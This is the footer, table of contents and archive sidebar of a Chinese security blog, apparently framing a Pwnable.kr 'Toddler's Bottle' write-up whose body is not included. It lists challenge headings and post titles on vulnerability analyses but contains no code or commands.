    <!-- 评论 -->
</main>
            <!-- profile -->
            
        </div>
        <footer class="footer footer-unloaded">
    <!-- social  -->
    
    <div class="social">
        
    
        
            
                <a href="mailto:master@mail.sari3l.com" class="iconfont-archer email" title=email ></a>
            
        
    
        
            
                <a href="https://github.com/sari3l" class="iconfont-archer github" target="_blank" title=github></a>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
            
                <a href="https://www.instagram.com/x3rias" class="iconfont-archer instagram" target="_blank" title=instagram></a>
            
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
            
                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
            
        
    

    </div>
    
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- 不蒜子  -->
    
</footer>
    </div>
    <!-- toc -->
    
    <div class="toc-wrapper" style=
    







top:50vh;

    >
        <div class="toc-catalog">
            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
        </div>
        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#准备"><span class="toc-number">1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-fd"><span class="toc-number">2.</span> <span class="toc-text">1. [fd]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目"><span class="toc-number">2.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-number">2.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题"><span class="toc-number">2.3.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-collision"><span class="toc-number">3.</span> <span class="toc-text">2. collision</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-1"><span class="toc-number">3.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-1"><span class="toc-number">3.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-1"><span class="toc-number">3.3.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-bof"><span class="toc-number">4.</span> <span class="toc-text">3. bof</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-2"><span class="toc-number">4.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-2"><span class="toc-number">4.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-2"><span class="toc-number">4.3.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-flag"><span class="toc-number">5.</span> <span class="toc-text">4. flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-3"><span class="toc-number">5.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-3"><span class="toc-number">5.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-3"><span class="toc-number">5.3.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-passcode"><span class="toc-number">6.</span> <span class="toc-text">5. passcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-4"><span class="toc-number">6.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-4"><span class="toc-number">6.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-4"><span class="toc-number">6.3.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-random"><span class="toc-number">7.</span> <span class="toc-text">6. random</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-5"><span class="toc-number">7.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-5"><span class="toc-number">7.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-5"><span class="toc-number">7.3.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-input"><span class="toc-number">8.</span> <span class="toc-text">7. input</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-6"><span class="toc-number">8.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-6"><span class="toc-number">8.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-6"><span class="toc-number">8.3.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-leg"><span class="toc-number">9.</span> <span class="toc-text">8. leg</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-7"><span class="toc-number">9.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-7"><span class="toc-number">9.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-7"><span class="toc-number">9.3.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-mistake"><span class="toc-number">10.</span> <span class="toc-text">9. mistake</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-8"><span class="toc-number">10.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-8"><span class="toc-number">10.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-8"><span class="toc-number">10.3.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-shellshock"><span class="toc-number">11.</span> <span class="toc-text">10. shellshock</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-9"><span class="toc-number">11.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-9"><span class="toc-number">11.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-9"><span class="toc-number">11.3.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-coin"><span class="toc-number">12.</span> <span class="toc-text">11. coin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-10"><span class="toc-number">12.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-10"><span class="toc-number">12.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-10"><span class="toc-number">12.3.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-blackjeck"><span class="toc-number">13.</span> <span class="toc-text">12. blackjeck</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-11"><span class="toc-number">13.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-11"><span class="toc-number">13.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-11"><span class="toc-number">13.3.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13-lotto"><span class="toc-number">14.</span> <span class="toc-text">13. lotto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-12"><span class="toc-number">14.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-12"><span class="toc-number">14.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-12"><span class="toc-number">14.3.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14-cmd1"><span class="toc-number">15.</span> <span class="toc-text">14. cmd1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-13"><span class="toc-number">15.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-13"><span class="toc-number">15.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-13"><span class="toc-number">15.3.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#15-cmd2"><span class="toc-number">16.</span> <span class="toc-text">15. cmd2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-14"><span class="toc-number">16.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-14"><span class="toc-number">16.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-14"><span class="toc-number">16.3.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16-uaf"><span class="toc-number">17.</span> <span class="toc-text">16. uaf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-15"><span class="toc-number">17.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-15"><span class="toc-number">17.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-15"><span class="toc-number">17.3.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#17-memcpy"><span class="toc-number">18.</span> <span class="toc-text">17. memcpy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-16"><span class="toc-number">18.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-16"><span class="toc-number">18.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-16"><span class="toc-number">18.3.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#18-asm"><span class="toc-number">19.</span> <span class="toc-text">18. asm</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-17"><span class="toc-number">19.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-17"><span class="toc-number">19.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-17"><span class="toc-number">19.3.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#19-unlink"><span class="toc-number">20.</span> <span class="toc-text">19. unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-18"><span class="toc-number">20.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-18"><span class="toc-number">20.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-18"><span class="toc-number">20.3.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#20-blukat"><span class="toc-number">21.</span> <span class="toc-text">20. blukat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-19"><span class="toc-number">21.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-19"><span class="toc-number">21.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-19"><span class="toc-number">21.3.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21-horcruxes"><span class="toc-number">22.</span> <span class="toc-text">21. horcruxes</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-20"><span class="toc-number">22.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-20"><span class="toc-number">22.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-20"><span class="toc-number">22.3.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">23.</span> <span class="toc-text">参考</span></a></li></ol> -->
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#准备"><span class="toc-text">准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-fd"><span class="toc-text">1. [fd]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题"><span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-collision"><span class="toc-text">2. collision</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-1"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-1"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-1"><span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-bof"><span class="toc-text">3. bof</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-2"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-2"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-2"><span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-flag"><span class="toc-text">4. flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-3"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-3"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-3"><span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-passcode"><span class="toc-text">5. passcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-4"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-4"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-4"><span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-random"><span class="toc-text">6. random</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-5"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-5"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-5"><span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-input"><span class="toc-text">7. input</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-6"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-6"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-6"><span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-leg"><span class="toc-text">8. leg</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-7"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-7"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-7"><span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-mistake"><span class="toc-text">9. mistake</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-8"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-8"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-8"><span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-shellshock"><span class="toc-text">10. shellshock</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-9"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-9"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-9"><span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-coin"><span class="toc-text">11. coin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-10"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-10"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-10"><span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-blackjeck"><span class="toc-text">12. blackjeck</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-11"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-11"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-11"><span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13-lotto"><span class="toc-text">13. lotto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-12"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-12"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-12"><span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14-cmd1"><span class="toc-text">14. cmd1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-13"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-13"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-13"><span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#15-cmd2"><span class="toc-text">15. cmd2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-14"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-14"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-14"><span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16-uaf"><span class="toc-text">16. uaf</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-15"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-15"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-15"><span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#17-memcpy"><span class="toc-text">17. memcpy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-16"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-16"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-16"><span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#18-asm"><span class="toc-text">18. asm</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-17"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-17"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-17"><span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#19-unlink"><span class="toc-text">19. unlink</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-18"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-18"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-18"><span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#20-blukat"><span class="toc-text">20. blukat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-19"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-19"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-19"><span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21-horcruxes"><span class="toc-text">21. horcruxes</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目-20"><span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-20"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题-20"><span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol>
    </div>
    
    <div class="back-top iconfont-archer">&#xe639;</div>
    <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
          <div class="sidebar-panel-archives">
    <!-- 在ejs中将archive按照时间排序 -->
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <div class="total-and-search">
        <div class="total-archive">
        Total : 75
        </div>
        <!-- search  -->
        
    </div>
    
    <div class="post-archive">
    
    
    
    
    <div class="archive-year"> 2021 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/14</span><a class="archive-post-title" href= "/posts/9e42d867/" >Log4shell 小记</a>
        </li>
    
    
    
    
    
        </ul>
    
    <div class="archive-year"> 2020 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/15</span><a class="archive-post-title" href= "/posts/9a92d107/" >🔐</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/15</span><a class="archive-post-title" href= "/posts/fd03bf87/" >🔐</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/12</span><a class="archive-post-title" href= "/posts/df08045a/" >🔐</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/posts/787c7e6c/" >🔐</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/posts/55ea3bd4/" >Shiro-055 分析&回显</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/posts/6712089c/" >深信服 EDR RCE 简析</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/04</span><a class="archive-post-title" href= "/posts/c5e878c3/" >CobaltStrike Argue 原理 - 翻译文</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">08/02</span><a class="archive-post-title" href= "/posts/afd91327/" >Github Page 加速</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/31</span><a class="archive-post-title" href= "/posts/76ce816c/" >CobaltStrike 破解步骤</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/13</span><a class="archive-post-title" href= "/posts/b7ea5c49/" >一道题回顾智能合约 Coverage</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/06</span><a class="archive-post-title" href= "/posts/58a67794/" >F5 BIG-IP RCE简单分析</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/17</span><a class="archive-post-title" href= "/posts/608d18f0/" >用友NC反序列化 简单分析</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/14</span><a class="archive-post-title" href= "/posts/d4fb29f2/" >Pwnable.kr 之 Toddler's Bottle</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/posts/ecb4dfa2/" >Weblogic T3 协议学习</a>
        </li>
    
    
